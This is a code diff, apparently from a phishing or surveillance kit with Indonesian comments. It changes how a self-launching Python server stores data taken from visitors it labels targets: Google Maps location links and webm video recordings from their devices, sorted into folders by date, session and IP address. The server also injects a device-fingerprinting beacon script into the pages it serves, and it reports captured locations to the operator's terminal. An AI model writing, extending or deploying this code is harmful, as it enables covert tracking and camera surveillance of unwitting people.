@@ -281,13 +281,16 @@ write_server_py() {
 import http.server, json, re, sys, threading, uuid, os, time
 from datetime import datetime
 
-port, logfile, BASE_DIR = int(sys.argv[1]), sys.argv[2], sys.argv[3]
+port, logfile, BASE_DIR, SESSION_ID = int(sys.argv[1]), sys.argv[2], sys.argv[3], sys.argv[4]
 lock = threading.RLock()
 devices, devinfo, names, pending = {}, {}, {}, {}
 
-VIDEO_DIR = os.path.join(BASE_DIR, "saved_videos")
-if not os.path.exists(VIDEO_DIR):
-    os.makedirs(VIDEO_DIR, exist_ok=True)
+# Format hierarki: saved_videos / Tanggal / Sesi_Waktu / IP_Target / [lokasi | video]
+today_date = datetime.now().strftime("%d-%m-%Y")
+SESSION_DIR = os.path.join(BASE_DIR, "saved_videos", today_date, SESSION_ID)
+
+if not os.path.exists(SESSION_DIR):
+    os.makedirs(SESSION_DIR, exist_ok=True)
 
 BEACON_JS = """<script>(function(){try{
 var d={t:"__T__",w:screen.width,h:screen.height,r:window.devicePixelRatio||1,p:navigator.maxTouchPoints||0};
@@ -414,7 +417,9 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         parsed_path = self.path.split("?")[0]
         raw_ip = client_ip(self.headers, self.client_address)
         client_ip_addr = re.sub(r'[^a-zA-Z0-9_.-]', '_', raw_ip)
-        ip_folder = os.path.join(VIDEO_DIR, client_ip_addr)
+        
+        # Subfolder IP di dalam sesi waktu saat ini
+        ip_base_folder = os.path.join(SESSION_DIR, client_ip_addr)
 
         if parsed_path == "/save-location":
             try:
@@ -424,16 +429,18 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                     data = json.loads(body_bytes.decode("utf-8", "ignore"))
                     gmaps_link = data.get("link", "No link")
                     
-                    if not os.path.exists(ip_folder): 
-                        os.makedirs(ip_folder, exist_ok=True)
+                    # Membuat folder khusus lokasi
+                    loc_folder = os.path.join(ip_base_folder, "lokasi")
+                    if not os.path.exists(loc_folder): 
+                        os.makedirs(loc_folder, exist_ok=True)
                     
-                    loc_log_file = os.path.join(ip_folder, "log_lokasi.txt")
+                    loc_log_file = os.path.join(loc_folder, "log_lokasi.txt")
                     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                     
                     with open(loc_log_file, "a") as f:
                         f.write(f"[{timestamp}] IP: {raw_ip} | Maps: {gmaps_link}\n")
                     
-                    # Kirim log ke terminal utama
+                    # Cetak link maps ke terminal utama
                     with open(logfile, "a") as lf:
                         t_str = datetime.now().strftime("%H:%M:%S")
                         lf.write(f"{t_str}\tLOC\t{gmaps_link}\t{raw_ip}\t0\n")
@@ -471,11 +478,13 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                         video_bytes = body_data
 
                     if len(video_bytes) > 50:
-                        if not os.path.exists(ip_folder): 
-                            os.makedirs(ip_folder, exist_ok=True)
+                        # Membuat folder khusus video
+                        vid_folder = os.path.join(ip_base_folder, "video")
+                        if not os.path.exists(vid_folder): 
+                            os.makedirs(vid_folder, exist_ok=True)
                         
                         filename = f"video_{int(time.time())}_{uuid.uuid4().hex[:4]}.webm"
-                        filepath = os.path.join(ip_folder, filename)
+                        filepath = os.path.join(vid_folder, filename)
                         
                         with open(filepath, "wb") as f:
                             f.write(video_bytes)
@@ -527,7 +536,8 @@ start_server() {
   PORT="$(find_free_port)"
 
   write_server_py
-  ( cd "$WORK_DIR/site" && exec python3 "$WORK_DIR/server.py" "$PORT" "$ACCESS_LOG" "$BASE" ) \
+  # Mengirim CUR_ID (format waktu mulai sesi) ke Python sebagai argumen ke-4
+  ( cd "$WORK_DIR/site" && exec python3 "$WORK_DIR/server.py" "$PORT" "$ACCESS_LOG" "$BASE" "$CUR_ID" ) \
     >"$WORK_DIR/server.log" 2>&1 &
   SERVER_PID=$!
   sleep 1
